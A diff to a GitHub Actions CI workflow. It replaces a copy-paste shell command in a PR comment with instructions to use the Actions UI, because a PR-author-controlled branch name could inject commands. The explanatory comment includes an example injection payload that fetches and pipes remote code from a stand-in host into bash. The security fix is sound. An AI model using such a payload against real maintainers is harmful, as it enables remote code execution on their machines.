@@ -1196,7 +1196,23 @@ jobs:
             if [ $dispatch_exit -ne 0 ]; then
               dispatch_error=$(cat /tmp/force-run-error.txt)
               echo "gh workflow run failed (exit $dispatch_exit): $dispatch_error"
-              gh pr comment "$PR_NUMBER" --body "🔁 The AI reviewer disagreed with the CI skip logic for this diff and requested a force-run of: \`$force_jobs\`, but triggering it failed (a dispatch error, not a job failure -- see this job's own log for details). Trigger it by hand if still wanted: \`gh workflow run ci.yml --ref $HEAD_REF -f force_jobs=$force_jobs\`."
+              # Deliberately does NOT display a literal `gh workflow run
+              # --ref $HEAD_REF ...` command here, even though embedding it
+              # in this bash string is itself safe (no shell re-execution
+              # happens building a --body string). The risk is downstream:
+              # HEAD_REF is a PR-author-controlled branch name, and this
+              # would render it in the PR comment as a "copy this and run
+              # it" shell snippet -- if a maintainer copy-pastes it into
+              # their own terminal trusting the suggestion, THEIR shell
+              # would parse whatever the branch name contains, e.g. a
+              # crafted $(curl evil/x|bash). A live review round caught
+              # this as a distinct risk from the runner-side interpolation
+              # fixed above (env: HEAD_REF protects the runner; it does
+              # nothing for text a human later copies out of this comment
+              # and pastes into their own shell). Pointing at the Actions
+              # UI instead sidesteps it entirely -- the branch there comes
+              # from GitHub's own picker, never copy-pasted text.
+              gh pr comment "$PR_NUMBER" --body "🔁 The AI reviewer disagreed with the CI skip logic for this diff and requested a force-run of: \`$force_jobs\`, but triggering it automatically failed (a dispatch error, not a job failure -- see this job's own log for details). To trigger it by hand: open the Actions tab, select the CI workflow, click \"Run workflow\", pick this PR's branch from the dropdown, and set \`force_jobs\` to \`$force_jobs\`. Don't copy a branch name out of a PR comment into a shell command -- it isn't sanitized for that."
             elif [ -n "$run_url" ]; then
               gh pr comment "$PR_NUMBER" --body "🔁 The AI reviewer disagreed with the CI skip logic for this diff and requested a force-run of: \`$force_jobs\`. Triggered run: $run_url — runs independently of this PR's normal required checks, since GitHub Actions can't retroactively un-skip a job in the run already in progress."
             else
